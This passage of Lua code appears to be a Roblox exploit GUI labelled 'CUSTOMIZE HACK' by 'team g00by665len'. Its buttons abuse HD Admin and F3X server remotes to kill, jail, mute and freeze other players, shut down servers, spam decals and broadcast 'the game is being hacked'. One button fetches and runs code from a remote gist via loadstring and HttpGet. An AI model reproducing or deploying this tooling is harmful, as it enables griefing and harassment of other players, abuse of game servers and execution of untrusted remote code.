    {Name = "c00kidd funk", ID = "100828050594137", Pitch = 1, Volume = "inf"},
    {Name = "Low Throat Singing 3", ID = "1845939536", Pitch = 1, Volume = "inf"},
    {Name = "d3r, m1v, asteria no escape", ID = "18841891575", Pitch = 1, Volume = "inf"},
    {Name = "[ww2]na## Germany", ID = "1845868993", Pitch = 1, Volume = "inf"},
    {Name = "jumpscare sound", ID = "6129291390", Pitch = 1, Volume = "inf"},
    {Name = "Erica funk", ID = "72796362292502", Pitch = 0.1, Volume = "inf"},
    {Name = "Squid game", ID = "1843536434", Pitch = 1, Volume = "inf"},
    {Name = "arabe song", ID = "136356992500400", Pitch = 0.29, Volume = "inf"},
    {Name = "'Euro Techno'", ID = "1839246734", Pitch = 1, Volume = "inf"},
    {Name = "'wongaaa'", ID = "136201301642679", Pitch = 0.1, Volume = "inf"},
    {Name = "what mr krabs wish he had", ID = "106282004905868", Pitch = 0.1, Volume = "inf"},
    {Name = "'/...'", ID = "112226782551255", Pitch = 0.1, Volume = "inf"},
    {Name = "'song removed '", ID = "110587373430189", Pitch = 0.1, Volume = "inf"},
    {Name = "''Illuminati'", ID = "105355441763420", Pitch = 0.1, Volume = "inf"},
    {Name = "''bodypartz''", ID = "127653283576622", Pitch = 1, Volume = "inf"}, 
    {Name = "nowjoinWorldofkoopkidd", ID = "8894394467", Pitch = 1, Volume = "inf"}, 
    {Name = "Spain Music", ID = "77535208560062", Pitch = 1, Volume = "inf"}, 
    {Name = "loser", ID = "87617522673082", Pitch = 0.7, Volume = "inf"}, 
    {Name = "B2STheme", ID = "91475390903970", Pitch = 1, Volume = "inf"}, 
    {Name = "godisagirlnightcore", ID = "100033974889149", Pitch = 0.8, Volume = "inf"}, 
    {Name = "gangsta'sparadise", ID = "5228173823", Pitch = 1, Volume = "inf"}, 
    {Name = "jump style slow", ID = "1839246711", Pitch = 0.7, Volume = "inf"}, 
    {Name = "jump style speed up", ID = "1839246711", Pitch = 1.3, Volume = "inf"},
    {Name = "xd", ID = "137709007266721", Pitch = 0.1, Volume = 56},
    {Name = "Old song", ID = "87694750844457", Pitch = 0.316, Volume = 1}
}

for _, s in ipairs(songs) do
    local btn = Instance.new("TextButton")
    styleButton(btn)
    btn.Text = s.Name
    btn.Parent = musicSec
    btn.MouseButton1Click:Connect(function()
        safeRemote(";Music " .. s.ID)
        safeRemote(";volume " .. tostring(s.Volume or s.V))
        if (s.Pitch or s.P) and (s.Pitch or s.P) ~= 0 then safeRemote(";Pitch " .. tostring(s.Pitch or s.P)) end
    end)
end

local trollSec = createSection(UDim2.new(0, 10, 0, 620), 140, "Players Troll")
local trollCmds = {
    {Text = "jail others", Command = ";jail others"},
    {Text = "shutdown", Command = ";shutdown"},
    {Text = "Kill Others", Command = ";kill others"},
    {Text = "Mute Others", Command = ";mute others"},
    {Text = "Title Others TEAM", Command = ";Titler others TEAM g00by665len"},
    {Text = "Title You", Command = ";titler me g00by665len"},
    {Text = "R6 All", Command = ";r6 all"},
    {Text = "Freeze Others", Command = ";ice others"},
    {Text = "tp all You", Command = ";tp all"},
    {Text = "fire kill", Command = ";fire others ;kill others"}
}
for _, info in ipairs(trollCmds) do
    local btn = Instance.new("TextButton")
    styleButton(btn)
    btn.Text = info.Text
    btn.Parent = trollSec
    btn.MouseButton1Click:Connect(function() safeRemote(info.Command) end)
end 

local hdSec = createSection(UDim2.new(0, 10, 0, 800), 140, "HD Admin")
local hdExtData = {
    {Text = "Message", Command = ";sm TEAM G00BY665LEN JOHN TUDAY"},
    {Text = "Theme 2", Command = ";music 94284750410104 ;pitch 0.2 ;volume inf"},
    {Text = "R6", Command = ";r6"},
    {Text = "UnCmdBar2 All", Command = ";uncmdbar2 all"},
    {Text = "wallspeed 78", Command = ";speed me 78"},
    {Text = "char all", Command = ";char others SprunkiGrisgd ;name others g00by665len is you team"},
    {Text = "Announcement", Command = ";sm hack by team g00by665len"},
    {Text = "un mute", Command = ";unmute me"},
    {Text = "cmdbar2", Command = ";cmdbar2 me"},
    {Text = "notice", Command = ";notice all The game is being hacked by the g00by team"}
}

for _, info in ipairs(hdExtData) do
    createDestBtn(info.Text, hdSec, function() safeRemote(info.Command) end)
end

createDestBtn("cmdbar2 cracked", hdSec, function()
    loadstring(game:HttpGet("https://gist.githubusercontent.com/sprunkigris/93904bb9e1a8a4319ca4732ed90ef4f1/raw"))()
end)

createDestBtn("anti skid", hdSec, function()
    safeRemote(";hideguis others")
    safeRemote(";respawn others")
    safeRemote(";serverhint anti skid Activated by " .. player.Name .. " by the g00by GUI")
end)

createDestBtn("disco and neon", hdSec, function()
    local remote = getF3XRemote()
    if not remote or not player.Character then return end
    
    task.spawn(function()
        for _, part in ipairs(player.Character:GetDescendants()) do
            if part:IsA("BasePart") then
                pcall(function()
                    remote:InvokeServer("SetLocked", {part}, false)
                    remote:InvokeServer("SyncMaterial", {{Part = part, Material = Enum.Material.Neon}})
                end)
            end
        end
        
        while player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 do
            for _, part in ipairs(player.Character:GetDescendants()) do
                if part:IsA("BasePart") then
                    pcall(function()
                        local randomColor = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
                        remote:InvokeServer("SyncColor", {{Part = part, Color = randomColor, UnionColoring = false}})
                    end)
                end
            end
            task.wait()
        end
    end)
end)

local customPos = UDim2.new(0, 10, 0, 960)
local customTitleLine = Instance.new("Frame")
customTitleLine.Size = UDim2.new(1, 0, 0, 2)
customTitleLine.Position = UDim2.new(0, 0, 0, customPos.Y.Offset - 30)
customTitleLine.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
customTitleLine.Parent = mainFrame

local customTitleLabel = Instance.new("TextLabel")
customTitleLabel.Size = UDim2.new(1, 0, 0, 25)
customTitleLabel.Position = UDim2.new(0, 0, 0, customPos.Y.Offset - 28)
customTitleLabel.BackgroundTransparency = 1
customTitleLabel.Text = "CUSTOMIZE HACK"
customTitleLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
customTitleLabel.Font = Enum.Font.GothamBold
customTitleLabel.TextSize = 14
customTitleLabel.Parent = mainFrame

local customContainer = Instance.new("Frame")
customContainer.Size = UDim2.new(1, -20, 0, 120)
customContainer.Position = customPos
customContainer.BackgroundTransparency = 1
customContainer.Parent = mainFrame

local customImageLabel = Instance.new("ImageLabel")
customImageLabel.Size = UDim2.new(0, 75, 0, 75)
customImageLabel.Position = UDim2.new(0, 0, 0, 0)
customImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
customImageLabel.BorderSizePixel = 1
customImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
customImageLabel.Image = "rbxassetid://" .. DECAL_IDS[1]
customImageLabel.Parent = customContainer

local customIdTextBox = Instance.new("TextBox")
customIdTextBox.Size = UDim2.new(1, -85, 0, 35)
customIdTextBox.Position = UDim2.new(0, 85, 0, 0)
customIdTextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
customIdTextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
customIdTextBox.PlaceholderText = "add your sky/decals"
customIdTextBox.Text = DECAL_IDS[1]
customIdTextBox.Font = Enum.Font.GothamBold
customIdTextBox.TextSize = 11
customIdTextBox.BorderSizePixel = 1
customIdTextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
customIdTextBox.ClearTextOnFocus = false
customIdTextBox.Parent = customContainer

local currentCustomId = DECAL_IDS[1]
updateCustomId = function(id)
    currentCustomId = tostring(id)
    customIdTextBox.Text = currentCustomId
    customImageLabel.Image = "rbxassetid://" .. currentCustomId
end

customIdTextBox.FocusLost:Connect(function()
    if customIdTextBox.Text ~= "" then
        currentCustomId = customIdTextBox.Text
        pcall(function()
            customImageLabel.Image = "rbxassetid://" .. currentCustomId
        end)
    end
end)

local btnCustomDecal = Instance.new("TextButton")
styleButton(btnCustomDecal)
btnCustomDecal.Size = UDim2.new(0.5, -3, 0, 35)
btnCustomDecal.Position = UDim2.new(0, 85, 0, 40)
btnCustomDecal.Text = "Decal gustom"
btnCustomDecal.Parent = customContainer
btnCustomDecal.MouseButton1Click:Connect(function()
    if currentCustomId ~= "" then
        doDecalSpam(currentCustomId)
    end
end)

local btnCustomSky = Instance.new("TextButton")
styleButton(btnCustomSky)
btnCustomSky.Size = UDim2.new(0.5, -3, 0, 35)
btnCustomSky.Position = UDim2.new(0.5, 3, 0, 40)
btnCustomSky.Text = "Sky gustom"
btnCustomSky.Parent = customContainer
btnCustomSky.MouseButton1Click:Connect(function()
    if currentCustomId ~= "" then
        createSky(currentCustomId)
    end
end)

local tagSec = createSection(UDim2.new(0, 10, 0, 1110), 80, "Etiquetas")
local function createTag(txt, color)
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(0, 145, 0, 35)
    label.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
    label.TextColor3 = color or Color3.fromRGB(0, 0, 0)
    label.Text = txt
    label.Font = Enum.Font.GothamBold
    label.TextSize = 10
    label.BorderSizePixel = 1
    label.BorderColor3 = Color3.fromRGB(200, 200, 200)
    label.Parent = tagSec
end
createTag("BY: g00by665len", Color3.fromRGB(0, 0, 0))
createTag("VERSION: 10.5 (PC & Mobile Support)", Color3.fromRGB(0, 100, 0))
createTag("STATUS: ACTIVE", Color3.fromRGB(0, 100, 255))
createTag("SERVER SIDE: F3X/HD", Color3.fromRGB(150, 0, 0))